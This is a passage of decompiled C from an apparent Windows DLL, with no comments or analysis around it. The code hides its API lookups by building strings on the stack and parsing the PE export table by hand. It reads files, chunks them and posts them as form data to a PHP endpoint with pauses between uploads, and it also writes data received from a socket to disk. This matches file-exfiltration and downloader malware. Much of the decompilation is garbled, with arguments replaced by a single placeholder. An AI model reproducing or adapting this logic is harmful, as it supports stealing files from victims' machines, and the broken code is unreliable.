                                                        v65 = (int32_t)v94 + 4;
                                                        goto lab_0x10007dd4;
                                                    }
                                                } else {
                                                    // 0x10007d2c
                                                    *(int32_t *)a2 = 9;
                                                    v68 = v91;
                                                    v65 = (int32_t)v92 + 4;
                                                    goto lab_0x10007dd4;
                                                }
                                            } else {
                                                // 0x10007cf8
                                                *(int32_t *)a2 = 7;
                                                v68 = v89;
                                                v65 = (int32_t)v90 + 4;
                                                goto lab_0x10007dd4;
                                            }
                                        } else {
                                            // 0x10007cc4
                                            *(int32_t *)a2 = 6;
                                            v68 = v87;
                                            v65 = (int32_t)v88 + 3;
                                            goto lab_0x10007dd4;
                                        }
                                    } else {
                                        // 0x10007c92
                                        *(int32_t *)a2 = 5;
                                        v68 = v85;
                                        v65 = (int32_t)v86 + 3;
                                        goto lab_0x10007dd4;
                                    }
                                } else {
                                    // 0x10007c64
                                    *(int32_t *)a2 = 4;
                                    v68 = v83;
                                    v65 = (int32_t)v84 + 4;
                                    goto lab_0x10007dd4;
                                }
                            } else {
                                // 0x10007c3e
                                v67 = v81;
                                v64 = (int32_t)v82 + 4;
                                goto lab_0x10007dc8;
                            }
                        } else {
                            // 0x10007c0c
                            *(int32_t *)a2 = 2;
                            v68 = v79;
                            v65 = (int32_t)v80 + 4;
                            goto lab_0x10007dd4;
                        }
                    } else {
                        // 0x10007bda
                        *(int32_t *)a2 = 0;
                        v68 = v77;
                        v65 = (int32_t)v78 + 6;
                        goto lab_0x10007dd4;
                    }
                } else {
                    // 0x10007ba2
                    *(int32_t *)a2 = 1;
                    v68 = v75;
                    v65 = (int32_t)v76 + 5;
                    goto lab_0x10007dd4;
                }
            }
        } else {
            goto lab_0x10007b43;
        }
    }
  lab_0x10007e9f:
    // 0x10007e9f
    function_1000b43d();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    int32_t v101 = v25 - 4; // 0x10007eb0
    *(int32_t *)v101 = v2;
    *(int32_t *)(v25 - 12) = g66 ^ v101;
    *(int32_t *)(v25 - 2424) = v20;
    *(int32_t *)(v25 - 2428) = v24;
    *(int32_t *)(v25 - 2432) = v22;
    int32_t * v102 = (int32_t *)(v25 - 2436); // 0x10007ec9
    *v102 = 99;
    int32_t * v103 = (int32_t *)(v25 - 2404); // 0x10007ecb
    *v103 = *(int32_t *)(v25 + 8);
    int32_t * v104 = (int32_t *)(v25 - 2396); // 0x10007ed6
    *v104 = v23;
    int32_t * v105 = (int32_t *)(v25 - 2440); // 0x10007edc
    *v105 = 0;
    int32_t * v106 = (int32_t *)(v25 - 2444); // 0x10007ede
    *v106 = v25 - 127;
    _memset(&g161, (int32_t)&g161, (int32_t)&g161);
    int32_t v107 = v25 - 128; // 0x10007ee7
    *(int32_t *)v107 = 0x6e72656b;
    *(int32_t *)(v25 - 124) = 0x32336c65;
    *(int32_t *)(v25 - 120) = 0x6c6c642e;
    *(char *)(v25 - 116) = 0;
    *v102 = v107;
    int32_t moduleHandle = (int32_t)GetModuleHandleA((char *)&g161); // 0x10007f04
    int32_t v108 = v25 - 232; // 0x10007f0c
    *(int32_t *)v108 = 0x64616f4c;
    *(int32_t *)(v25 - 228) = 0x7262694c;
    *(int32_t *)(v25 - 224) = 0x41797261;
    *(char *)(v25 - 220) = 0;
    int32_t v109 = *(int32_t *)(moduleHandle + 120 + *(int32_t *)(moduleHandle + 60)) + moduleHandle; // 0x10007f3e
    *v105 = v108;
    *v106 = moduleHandle;
    int32_t v110 = function_10007210((int32_t)&g161, (char *)&g161); // 0x10007f4a
    uint16_t v111 = *(int16_t *)(2 * v110 + moduleHandle + *(int32_t *)(v109 + 36)); // 0x10007f58
    int32_t v112 = *(int32_t *)(*(int32_t *)(v109 + 28) + moduleHandle + 4 * (int32_t)v111); // 0x10007f62
    int32_t v113 = v112 + moduleHandle; // 0x10007f68
    *v105 = v107;
    g137 = v113;
    *v106 = (int32_t)"WriteFile";
    int32_t * v114 = (int32_t *)(v25 - 2448); // 0x10007f79
    *v114 = v113;
    int32_t v115 = *(int32_t *)(v113 + 120 + *(int32_t *)(v113 + 60)) + v113; // 0x10007f85
    int32_t v116 = function_10007210((int32_t)&g161, (char *)&g161); // 0x10007f8c
    uint16_t v117 = *(int16_t *)(2 * v116 + v113 + *(int32_t *)(v115 + 36)); // 0x10007f9a
    int32_t v118 = *(int32_t *)(*(int32_t *)(v115 + 28) + v113 + 4 * (int32_t)v117); // 0x10007fa4
    *(int32_t *)(v25 - 2408) = v118 + v113;
    if (*(int32_t *)(v25 + 4) != 0) {
        // 0x100080cc
        *v106 = 0;
        int32_t v119 = v25 - 2420; // 0x100080ce
        *v114 = v119;
        if (v119 == 0) {
            // 0x100083fb
            return _40___security_check_cookie_40_4();
        }
        // 0x100080e3
        *(int32_t *)(v25 - 2452) = 1;
        *(int32_t *)(v25 - 2456) = 0;
        *(int32_t *)(v25 - 2460) = 3;
        *(int32_t *)(v25 - 2464) = 0;
        *(int32_t *)(v25 - 2468) = 0;
        *(int32_t *)(v25 - 2472) = 80;
        *(int32_t *)(v25 - 2476) = *v104;
        *(int32_t *)(v25 - 2480) = g146;
        int32_t * v120 = (int32_t *)(v25 - 2400); // 0x10008101
        *v120 = v119;
        int128_t v121 = __asm_movdqa_9(0x7061203a657079542d746e65746e6f43); // 0x1000810f
        int32_t v122 = v25 - 336; // 0x10008117
        __asm_movdqu(*(int128_t *)v122, v121);
        int32_t v123 = v25 - 2484; // 0x1000811f
        int32_t * v124 = (int32_t *)v123; // 0x1000811f
        *v124 = 100;
        __asm_movdqu(*(int128_t *)(v25 - 320), __asm_movdqa_9(g36));
        __asm_movdqu(*(int128_t *)(v25 - 304), __asm_movdqa_9(0x6465646f636e656c72752d6d726f66));
        int32_t * v125 = _malloc((int32_t)&g161); // 0x10008141
        int32_t v126 = v25 - 2392; // 0x10008146
        int32_t * v127 = (int32_t *)v126; // 0x10008146
        *v127 = (int32_t)v125;
        *(int32_t *)(v25 - 2388) = 0;
        *v104 = 0;
        *(char *)v125 = 97;
        *(char *)(*v127 + 1) = 112;
        *(char *)(*v127 + 2) = 112;
        *(char *)(*v127 + 3) = 108;
        *(char *)(*v127 + 4) = 105;
        *(char *)(*v127 + 5) = 99;
        *(char *)(*v127 + 6) = 97;
        *(char *)(*v127 + 7) = 116;
        *(char *)(*v127 + 8) = 105;
        *(char *)(*v127 + 9) = 111;
        *(char *)(*v127 + 10) = 110;
        *(char *)(*v127 + 11) = 47;
        *(char *)(*v127 + 12) = 120;
        *(char *)(*v127 + 13) = 45;
        *(char *)(*v127 + 14) = 119;
        *(char *)(*v127 + 15) = 119;
        *(char *)(*v127 + 16) = 119;
        *(char *)(*v127 + 17) = 45;
        *(char *)(*v127 + 18) = 102;
        *(char *)(*v127 + 19) = 111;
        *(char *)(*v127 + 20) = 114;
        *(char *)(*v127 + 21) = 109;
        *(char *)(*v127 + 22) = 45;
        *(char *)(*v127 + 23) = 117;
        *(char *)(*v127 + 24) = 114;
        *(char *)(*v127 + 25) = 108;
        *(char *)(*v127 + 26) = 101;
        *(char *)(*v127 + 27) = 110;
        *(char *)(*v127 + 28) = 99;
        *(char *)(*v127 + 29) = 111;
        *(char *)(*v127 + 30) = 100;
        *(char *)(*v127 + 31) = 101;
        *(char *)(*v127 + 32) = 100;
        *(char *)(*v127 + 33) = 0;
        int32_t v128 = v25 - 24; // 0x100082b0
        *(int32_t *)v128 = 0x54534f50;
        *(char *)(v25 - 20) = 0;
        *v124 = v21;
        uint32_t v129 = lstrlenA((char *)&g161); // 0x100082be
        int32_t v130 = 0; // 0x100082c6
        int32_t v131 = v123; // 0x100082c6
        if (v129 >= 1) {
            int32_t v132 = v130 + v21;
            if (*(char *)v132 == 46) {
                // 0x100082ce
                if (*(char *)(v132 + 1) == 112) {
                    // 0x100082d5
                    if (*(char *)(v132 + 2) == 104) {
                        // 0x100082dc
                        if (*(char *)(v132 + 3) == 112) {
                            // 0x100082e3
                            *(char *)(v132 + 4) = 0;
                            *v104 = v132 + 5;
                        }
                    }
                }
            }
            int32_t v133 = v123 - 4; // 0x100082f3
            *(int32_t *)v133 = v21;
            int32_t v134 = v130 + 1; // 0x100082f4
            uint32_t v135 = lstrlenA((char *)&g161); // 0x100082f5
            int32_t v136 = v133; // 0x100082fd
            v130 = v134;
            v131 = v133;
            while (v134 < v135) {
                // 0x100082c8
                v132 = v130 + v21;
                if (*(char *)v132 == 46) {
                    // 0x100082ce
                    if (*(char *)(v132 + 1) == 112) {
                        // 0x100082d5
                        if (*(char *)(v132 + 2) == 104) {
                            // 0x100082dc
                            if (*(char *)(v132 + 3) == 112) {
                                // 0x100082e3
                                *(char *)(v132 + 4) = 0;
                                *v104 = v132 + 5;
                            }
                        }
                    }
                }
                // 0x100082f3
                v133 = v136 - 4;
                *(int32_t *)v133 = v21;
                v134 = v130 + 1;
                v135 = lstrlenA((char *)&g161);
                v136 = v133;
                v130 = v134;
                v131 = v133;
            }
        }
        // 0x100082ff
        *(int32_t *)(v131 - 4) = 0;
        *(int32_t *)(v131 - 8) = -0x7c000000;
        *(int32_t *)(v131 - 12) = v126;
        *(int32_t *)(v131 - 16) = 0;
        *(int32_t *)(v131 - 20) = 0;
        *(int32_t *)(v131 - 24) = v21;
        *(int32_t *)(v131 - 28) = v128;
        *(int32_t *)(v131 - 32) = *v120;
        if (v128 == 0) {
            // 0x10008043
            return _40___security_check_cookie_40_4();
        }
        int32_t v137 = v122;
        int32_t v138 = v137 + 1; // 0x10008337
        while (*(char *)v137 != 0) {
            // 0x10008335
            v137 = v138;
            v138 = v137 + 1;
        }
        int32_t v139 = *v104; // 0x1000833c
        *(int32_t *)(v131 - 36) = v139;
        *(int32_t *)(v131 - 40) = lstrlenA((char *)&g161);
        *(int32_t *)(v131 - 44) = v139;
        *(int32_t *)(v131 - 48) = 335 - v25 + v138;
        *(int32_t *)(v131 - 52) = v122;
        *(int32_t *)(v131 - 56) = v128;
        *(int32_t *)(v131 - 60) = 0;
        *(int32_t *)(v131 - 64) = 128;
        *(int32_t *)(v131 - 68) = 2;
        *(int32_t *)(v131 - 72) = 0;
        *(int32_t *)(v131 - 76) = 0;
        *(int32_t *)(v131 - 80) = 0x40000000;
        *(int32_t *)(v131 - 84) = *v103;
        int32_t * v140 = CreateFileW((int16_t *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161); // 0x10008374
        int32_t v141 = (int32_t)v140; // 0x10008374
        int32_t v142 = v25 - 2412; // 0x1000837c
        *(int32_t *)(v131 - 88) = v142;
        *(int32_t *)(v131 - 92) = 2048;
        int32_t v143 = v25 - 2384; // 0x10008388
        *(int32_t *)(v131 - 96) = v143;
        int32_t v144 = v131 - 100; // 0x1000838f
        *(int32_t *)v144 = v128;
        int32_t v145 = v144; // 0x10008398
        if (v143 != 0) {
            int32_t * v146 = (int32_t *)v142; // 0x100083a0
            int32_t v147 = *v146; // 0x100083a0
            v145 = v144;
            if (v147 != 0) {
                int32_t v148 = v144; // 0x100083d1
                *(int32_t *)(v148 - 4) = 0;
                *(int32_t *)(v148 - 8) = v25 - 2416;
                *(int32_t *)(v148 - 12) = v147;
                *(int32_t *)(v148 - 16) = v143;
                *(int32_t *)(v148 - 20) = v141;
                *(int32_t *)(v148 - 24) = v142;
                *(int32_t *)(v148 - 28) = 2048;
                *(int32_t *)(v148 - 32) = v143;
                v148 -= 36;
                *(int32_t *)v148 = v128;
                int32_t v149 = *v146; // 0x100083a0
                v145 = v148;
                while (v149 != 0) {
                    // 0x100083aa
                    *(int32_t *)(v148 - 4) = 0;
                    *(int32_t *)(v148 - 8) = v25 - 2416;
                    *(int32_t *)(v148 - 12) = v149;
                    *(int32_t *)(v148 - 16) = v143;
                    *(int32_t *)(v148 - 20) = v141;
                    *(int32_t *)(v148 - 24) = v142;
                    *(int32_t *)(v148 - 28) = 2048;
                    *(int32_t *)(v148 - 32) = v143;
                    v148 -= 36;
                    *(int32_t *)v148 = v128;
                    v149 = *v146;
                    v145 = v148;
                }
            }
        }
        // 0x100083dc
        *(int32_t *)(v145 - 4) = v128;
        *(int32_t *)(v145 - 8) = *v120;
        *(int32_t *)(v145 - 12) = v141;
        CloseHandle(&g161);
        // 0x100083fb
        return _40___security_check_cookie_40_4();
    }
    int32_t v150 = function_10009460(); // 0x10007fc5
    if (v150 == -1) {
        // 0x100083fb
        return _40___security_check_cookie_40_4();
    }
    int32_t v151 = v25 - 2384;
    int32_t v152 = 0; // 0x10007880
    *(char *)(v152 + v151) = 0;
    int32_t v153 = v152 + 1; // 0x10007ff3
    v152 = v153;
    while (v153 != 1000) {
        // 0x10007feb
        *(char *)(v152 + v151) = 0;
        v153 = v152 + 1;
        v152 = v153;
    }
    // 0x10007ffb
    *v106 = 0;
    *v114 = 128;
    *(int32_t *)(v25 - 2452) = 2;
    *(int32_t *)(v25 - 2456) = 0;
    *(int32_t *)(v25 - 2460) = 0;
    *(int32_t *)(v25 - 2464) = 0x40000000;
    *(int32_t *)(v25 - 2468) = *v103;
    int32_t * v154 = CreateFileW((int16_t *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161); // 0x10008013
    int32_t v155 = (int32_t)v154; // 0x10008013
    *(int32_t *)(v25 - 2472) = 0;
    *(int32_t *)(v25 - 2476) = 2048;
    *(int32_t *)(v25 - 2480) = v151;
    *(int32_t *)(v25 - 2484) = v150;
    *v104 = v155;
    int32_t v156 = recv((int32_t)&g161, (char *)&g161, (int32_t)&g161, (int32_t)&g161); // 0x10008030
    if (v156 >= 0 != v156 != 0) {
        // 0x1000803c
        *(int32_t *)(v25 - 2488) = v150;
        closesocket((int32_t)&g161);
        // 0x10008043
        return _40___security_check_cookie_40_4();
    }
    int32_t v157 = (int32_t)*(char *)(v25 - 2372); // 0x10008056
    int32_t v158 = v25 - 2416; // 0x1000805d
    *(int32_t *)(v25 - 2488) = 0;
    *(int32_t *)(v25 - 2492) = v158;
    uint32_t v159 = v156 - v157; // 0x10008066
    *(int32_t *)(v25 - 2496) = v159;
    *(int32_t *)(v25 - 2500) = v151 + v157;
    int32_t v160 = v25 - 2504; // 0x10008071
    *(int32_t *)v160 = v155;
    int32_t v161 = v160; // 0x1000807c
    if (v159 >= 1) {
        *(int32_t *)(v160 - 4) = 0;
        *(int32_t *)(v160 - 8) = 2048;
        *(int32_t *)(v160 - 12) = v151;
        *(int32_t *)(v160 - 16) = v150;
        int32_t v162 = recv((int32_t)&g161, (char *)&g161, (int32_t)&g161, (int32_t)&g161); // 0x1000808f
        *(int32_t *)(v160 - 20) = 0;
        *(int32_t *)(v160 - 24) = v158;
        *(int32_t *)(v160 - 28) = v162;
        *(int32_t *)(v160 - 32) = v151;
        int32_t v163 = v160 - 36; // 0x100080a8
        *(int32_t *)v163 = *v104;
        int32_t v164 = v163; // 0x100080b2
        v161 = v163;
        while (v162 >= 0 == (v162 != 0)) {
            // 0x10008080
            *(int32_t *)(v164 - 4) = 0;
            *(int32_t *)(v164 - 8) = 2048;
            *(int32_t *)(v164 - 12) = v151;
            *(int32_t *)(v164 - 16) = v150;
            v162 = recv((int32_t)&g161, (char *)&g161, (int32_t)&g161, (int32_t)&g161);
            *(int32_t *)(v164 - 20) = 0;
            *(int32_t *)(v164 - 24) = v158;
            *(int32_t *)(v164 - 28) = v162;
            *(int32_t *)(v164 - 32) = v151;
            v163 = v164 - 36;
            *(int32_t *)v163 = *v104;
            v164 = v163;
            v161 = v163;
        }
    }
    // 0x100080b4
    *(int32_t *)(v161 - 4) = *v104;
    CloseHandle(&g161);
    *(int32_t *)(v161 - 8) = v150;
    closesocket((int32_t)&g161);
    // 0x100083fb
    return _40___security_check_cookie_40_4();
  lab_0x10007e79:
    // 0x10007e79
    *(int32_t *)(v63 - 4) = v54;
    LocalFree(&g161);
    *(int32_t *)(v63 - 8) = g119;
    ReleaseMutex(&g161);
    return _40___security_check_cookie_40_4();
  lab_0x10007b43:;
    int32_t v165 = v66 - 4; // 0x10007b43
    *(int32_t *)v165 = v54;
    LocalFree(&g161);
    int32_t v166 = v165; // 0x10007b44
    goto lab_0x10007b4a;
  lab_0x10007b4a:
    // 0x10007b4a
    *(int32_t *)(v166 - 4) = g119;
    ReleaseMutex(&g161);
    return _40___security_check_cookie_40_4();
  lab_0x10007dd4:;
    int32_t v167 = v68 - 4; // 0x10007dd4
    *(int32_t *)v167 = v65;
    int32_t v168 = lstrlenA((char *)&g161); // 0x10007dd5
    v66 = v167;
    if (v168 == 0) {
        goto lab_0x10007b43;
    } else {
        int32_t v169 = function_10005b30(); // 0x10007de5
        *(int32_t *)(v68 - 8) = (int32_t)"http://";
        *(int32_t *)(v68 - 12) = v169;
        char * v170 = StrStrIA((char *)v169, (char *)&g161); // 0x10007dfa
        int32_t v171 = v170 == NULL ? v169 : v169 + 7;
        *(int32_t *)(v68 - 16) = (int32_t)"https://";
        *(int32_t *)(v68 - 20) = v171;
        char * v172 = StrStrIA((char *)&g161, (char *)&g161); // 0x10007e09
        int32_t v173 = v172 == NULL ? v171 : v171 + 8;
        char v174 = *(char *)v173; // 0x10007e12
        int32_t v175 = 0; // 0x10007e1e
        int32_t v176 = v169; // 0x10007e1e
        if (v174 != 47) {
            char v177 = v174; // 0x10007e24
            int32_t v178 = v173; // 0x10007e24
            int32_t v179 = 0; // 0x10007e24
            while (v177 != 0) {
                // 0x10007e2a
                *(char *)(uFlags - v173 + v178) = v177;
                v179++;
                v178++;
                v177 = *(char *)v178;
                if (v177 == 47) {
                    // break -> 0x10007e36
                    break;
                }
            }
            // 0x10007e36
            v175 = v179;
            v176 = 0x1000000 * v169 / 0x1000000;
        }
        // 0x10007e3c
        *(char *)(v175 + uFlags) = 0;
        int32_t v180 = v175 + v173; // 0x10007e40
        int32_t v181 = v180; // 0x10007e4e
        *(char *)(uBytes - v180 + v181) = *(char *)v180;
        v181++;
        char v182 = *(char *)v181; // 0x10007e56
        int32_t v183 = 1; // 0x10007e58
        int32_t v184 = v183; // 0x10007e5d
        while (v182 != 0) {
            // 0x10007e50
            *(char *)(uBytes - v180 + v181) = v182;
            v181++;
            v182 = *(char *)v181;
            v183 = v184 + 1;
            v184 = v183;
        }
        // 0x10007e5f
        *(int32_t *)(v68 - 24) = v176;
        *(char *)(v183 + uBytes) = v182;
        LocalFree(&g161);
        int32_t v185 = v68 - 28; // 0x10007e71
        *(int32_t *)v185 = v54;
        LocalFree(&g161);
        v166 = v185;
        goto lab_0x10007b4a;
    }
  lab_0x10007dc8:
    // 0x10007dc8
    *(int32_t *)a2 = 3;
    v68 = v67;
    v65 = v64;
    goto lab_0x10007dd4;
}

// Address range: 0x10008420 - 0x100084aa
int32_t function_10008420(void) {
    int32_t v1 = 0; // 0x10008434
    int32_t v2; // 0x10008420
    uint32_t v3; // 0x10008420
    if (v3 >= 1) {
        int32_t v4 = 0; // 0x10008438
        int32_t v5; // 0x10008420
        int32_t v6 = (int32_t)(0x66666667 * (int64_t)v5 / 0x100000000) / 4; // 0x10008447
        int32_t v7 = (v6 >> 31) + v6; // 0x1000844f
        char v8 = v7;
        *(char *)(v4 + v2) = (char)v3 + 48 + -10 * v8;
        v4++;
        v1 = v4;
        while (v7 >= 0 == (v7 != 0)) {
            char v9 = v8;
            v6 = (int32_t)(0x66666667 * (int64_t)v7 / 0x100000000) / 4;
            v7 = (v6 >> 31) + v6;
            v8 = v7;
            *(char *)(v4 + v2) = v9 + 48 + -10 * v8;
            v4++;
            v1 = v4;
        }
    }
    int32_t v10 = v1;
    int32_t v11 = v10 + v2;
    *(char *)v11 = 0;
    int32_t v12 = v10 - (v10 >> 31); // 0x1000847f
    int32_t result = v12 / 2; // 0x10008481
    int32_t result2 = result; // 0x10008488
    int32_t v13 = v11; // 0x10008488
    if (v12 < 0 || v12 < 2) {
        // 0x100084a3
        return result;
    }
    int32_t v14 = 0; // 0x10008488
    v13--;
    char * v15 = (char *)v13; // 0x10008490
    unsigned char v16 = *v15; // 0x10008490
    result2 = result2 & -256 | (int32_t)v16;
    char * v17 = (char *)(v14 + v2); // 0x10008495
    *v17 = v16;
    v14++;
    *v15 = *v17;
    while (v14 < result) {
        // 0x10008490
        v13--;
        v15 = (char *)v13;
        v16 = *v15;
        result2 = result2 & -256 | (int32_t)v16;
        v17 = (char *)(v14 + v2);
        *v17 = v16;
        v14++;
        *v15 = *v17;
    }
    // 0x100084a3
    return result2;
}

// Address range: 0x100084b0 - 0x10008c74
int32_t function_100084b0(int32_t a1, int32_t a2, int32_t a3) {
    // 0x100084b0
    __chkstk();
    int32_t lpString2_; // 0x100084b0
    int32_t lpString2; // 0x100084b0
    _memset((int32_t *)a1, lpString2, lpString2_);
    int32_t v1; // bp-187, 0x100084b0
    char * lpString1_ = (char *)&v1; // bp-28, 0x1000850c
    _memset(NULL, (int32_t)&g161, (int32_t)&g161);
    int32_t * moduleHandle = GetModuleHandleA((char *)0x6e72656b); // 0x10008547
    int32_t v2 = (int32_t)moduleHandle; // 0x10008547
    int32_t v3 = *(int32_t *)(v2 + 120 + *(int32_t *)(v2 + 60)) + v2; // 0x1000857d
    lpString1_ = (char *)moduleHandle;
    int32_t v4 = function_10007210(76, (char *)0x7262694c); // 0x10008589
    uint16_t v5 = *(int16_t *)(2 * v4 + v2 + *(int32_t *)(v3 + 36)); // 0x10008597
    int32_t v6 = *(int32_t *)(*(int32_t *)(v3 + 28) + v2 + 4 * (int32_t)v5); // 0x100085a1
    int32_t v7 = v6 + v2; // 0x100085aa
    g137 = v7;
    char v8 = 76; // bp-188, 0x100085b6
    int32_t v9 = *(int32_t *)(v7 + 120 + *(int32_t *)(v7 + 60)) + v7; // 0x100085e0
    lpString1_ = &v8;
    int32_t v10 = function_10007210(76, (char *)0x6572466c); // 0x100085ec
    int32_t lpString2__ = 0; // bp-40, 0x100085f6
    uint16_t v11 = *(int16_t *)(2 * v10 + v7 + *(int32_t *)(v9 + 36)); // 0x100085fb
    int32_t v12 = *(int32_t *)(*(int32_t *)(v9 + 28) + v7 + 4 * (int32_t)v11); // 0x10008605
    _memset((int32_t *)(v12 + v7), (int32_t)&g161, (int32_t)&g161);
    char * v13 = (char *)0x6e72656b; // bp-308, 0x1000861f
    lpString1_ = (char *)&v13;
    GetModuleHandleA((char *)0x6e72656b);
    v8 = 76;
    g137 = function_100058f0();
    v8 = 76;
    function_100058f0();
    int32_t v14; // bp-515, 0x100084b0
    _memset(&v14, 0, 99);
    _memset(NULL, (int32_t)&g161, (int32_t)&g161);
    _memset(NULL, (int32_t)&g161, (int32_t)&g161);
    char * v15 = (char *)0x6e72656b; // bp-516, 0x10008707
    GetModuleHandleA((char *)0x6e72656b);
    g137 = function_100058f0();
    lpString2__ = (int32_t)&v15;
    int32_t hHandle = function_100058f0(); // 0x100087a2
    int32_t v16 = WaitForSingleObject((int32_t *)hHandle, (int32_t)&g161); // 0x100087b5
    int32_t v17 = 0; // bp-60, 0x100087c4
    char * v18 = (char *)-0x80000000; // bp-80, 0x100087d1
    char * lpFileName = (char *)a2; // 0x100087de
    int32_t * fileHandle = CreateFileA(lpFileName, -0x80000000, 0, NULL, 3, 128, NULL); // 0x100087de
    int32_t v19 = (int32_t)fileHandle; // bp-10732, 0x100087e4
    if (fileHandle == (int32_t *)-1) {
        // 0x100087ef
        ReleaseMutex(fileHandle);
        // 0x10008c5e
        return _40___security_check_cookie_40_4();
    }
    int32_t * memoryHandle = LocalAlloc(64, GetFileSize(fileHandle, &g161) + 1000); // 0x10008819
    lstrcpyA((char *)memoryHandle, lpFileName);
    lstrcatA((char *)memoryHandle, "||");
    int32_t v20 = lstrlenA(lpFileName); // 0x1000884a
    ReadFile(fileHandle, (int32_t *)((int32_t)memoryHandle + 2 + v20), (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
    CloseHandle(fileHandle);
    lstrlenA(lpFileName);
    int32_t lpString = function_100032e0(); // 0x10008882
    uint32_t v21 = lstrlenA((char *)lpString); // 0x1000889d
    int32_t v22 = v21 / 0x7a120; // 0x100088aa
    GetTickCount();
    function_10008420();
    char * lpString1 = (char *)v16; // 0x100088ca
    lstrcpyA(lpString1, (char *)lpString2);
    lstrcatA(lpString1, (char *)lpString2_);
    lstrcatA(lpString1, (char *)(char)"&yy");
    v8 = v16;
    lstrcatA((char *)(v16 & 255), (char *)&lpString2__);
    lstrcatA(lpString1, "=1");
    char * v23 = lpString1; // bp-200, 0x100088f7
    lstrlenA(lpString1);
    int32_t v24 = &v19; // 0x10008911
    int32_t v25; // bp-10724, 0x100084b0
    int32_t v26 = &v25; // 0x10008918
    function_10007880(v26, v24, (char)a1, a3);
    int128_t v27; // 0x100084b0
    int128_t v28 = __asm_xorps(v27, v27); // 0x10008924
    int32_t v29 = (int32_t)&v23; // 0x10008927
    int64_t v30; // 0x100084b0
    __asm_movq_10(v30, v28);
    v23 = (char *)61;
    int32_t v31 = v29; // 0x1000894e
    if (v21 >= 0x7a120) {
        int32_t v32 = v22; // 0x10008a10
        int32_t dwMilliseconds = lpString; // 0x100084b0
        *(int32_t *)(v29 - 4) = 1000;
        Sleep(dwMilliseconds);
        GetTickCount();
        function_10008420();
        *(int32_t *)(v29 - 12) = v16;
        lstrcpyA((char *)&g161, (char *)&g161);
        *(int32_t *)(v29 - 20) = v16;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v29 - 24) = (int32_t)"&tt";
        *(int32_t *)(v29 - 28) = v16;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v29 - 32) = (int32_t)&lpString2__;
        *(int32_t *)(v29 - 36) = v16;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v29 - 40) = v29;
        *(int32_t *)(v29 - 44) = v16;
        lstrcatA((char *)&g161, (char *)&g161);
        int32_t v33 = v29 - 48; // 0x100089bb
        *(int32_t *)v33 = v16;
        int32_t v34 = lstrlenA((char *)&g161); // 0x100089bc
        int32_t * v35 = (int32_t *)(v29 - 52); // 0x100089c0
        *v35 = 0x7a120;
        int32_t * v36 = (int32_t *)(v29 - 56); // 0x100089c5
        *v36 = dwMilliseconds;
        int32_t v37 = v34 + v16;
        int32_t * v38 = (int32_t *)(v29 - 60); // 0x100089ce
        *v38 = v37;
        function_1000c0f0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
        *(char *)(v37 + 0x7a120) = 0;
        *v35 = a3;
        *v36 = a1;
        *v38 = v24;
        *(int32_t *)(v29 - 64) = v26;
        function_10007880((int32_t)&g161, (int32_t)&g161, (char)&g161, (int32_t)&g161);
        v32--;
        dwMilliseconds += 0x7a120;
        v31 = v33;
        while (v32 != 0) {
            int32_t v39 = v33;
            *(int32_t *)(v39 - 4) = 1000;
            Sleep(dwMilliseconds);
            GetTickCount();
            function_10008420();
            *(int32_t *)(v39 - 12) = v16;
            lstrcpyA((char *)&g161, (char *)&g161);
            *(int32_t *)(v39 - 20) = v16;
            lstrcatA((char *)&g161, (char *)&g161);
            *(int32_t *)(v39 - 24) = (int32_t)"&tt";
            *(int32_t *)(v39 - 28) = v16;
            lstrcatA((char *)&g161, (char *)&g161);
            *(int32_t *)(v39 - 32) = (int32_t)&lpString2__;
            *(int32_t *)(v39 - 36) = v16;
            lstrcatA((char *)&g161, (char *)&g161);
            *(int32_t *)(v39 - 40) = v29;
            *(int32_t *)(v39 - 44) = v16;
            lstrcatA((char *)&g161, (char *)&g161);
            v33 = v39 - 48;
            *(int32_t *)v33 = v16;
            v34 = lstrlenA((char *)&g161);
            v35 = (int32_t *)(v39 - 52);
            *v35 = 0x7a120;
            v36 = (int32_t *)(v39 - 56);
            *v36 = dwMilliseconds;
            v37 = v34 + v16;
            v38 = (int32_t *)(v39 - 60);
            *v38 = v37;
            function_1000c0f0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
            *(char *)(v37 + 0x7a120) = 0;
            *v35 = a3;
            *v36 = a1;
            *v38 = v24;
            *(int32_t *)(v39 - 64) = v26;
            function_10007880((int32_t)&g161, (int32_t)&g161, (char)&g161, (int32_t)&g161);
            v32--;
            dwMilliseconds += 0x7a120;
            v31 = v33;
        }
    }
    int32_t v40 = v31 - 4; // 0x10008a22
    *(int32_t *)v40 = lpString;
    int32_t v41 = lstrlenA((char *)&g161); // 0x10008a28
    int32_t v42; // 0x100084b0
    int32_t v43; // 0x100084b0
    if ((int32_t)((0x100000000 * (int64_t)(v41 >> 31) | (int64_t)v41) % 0x7a120) == 0) {
        // 0x10008a22
        v42 = &lpString2__;
        v43 = v40;
    } else {
        // 0x10008a3a
        GetTickCount();
        function_10008420();
        *(int32_t *)(v31 - 12) = v16;
        lstrcpyA((char *)&g161, (char *)&g161);
        *(int32_t *)(v31 - 20) = v16;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v31 - 24) = (int32_t)"&tt";
        *(int32_t *)(v31 - 28) = v16;
        lstrcatA((char *)&g161, (char *)&g161);
        int32_t v44 = &lpString2__;
        *(int32_t *)(v31 - 32) = v44;
        *(int32_t *)(v31 - 36) = v16;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v31 - 40) = (int32_t)&g14;
        *(int32_t *)(v31 - 44) = v16;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v31 - 48) = v16;
        int32_t v45 = lstrlenA((char *)&g161); // 0x10008a79
        *(int32_t *)(v31 - 52) = lpString;
        int32_t v46 = lstrlenA((char *)&g161); // 0x10008a88
        int32_t v47 = v45 + v16;
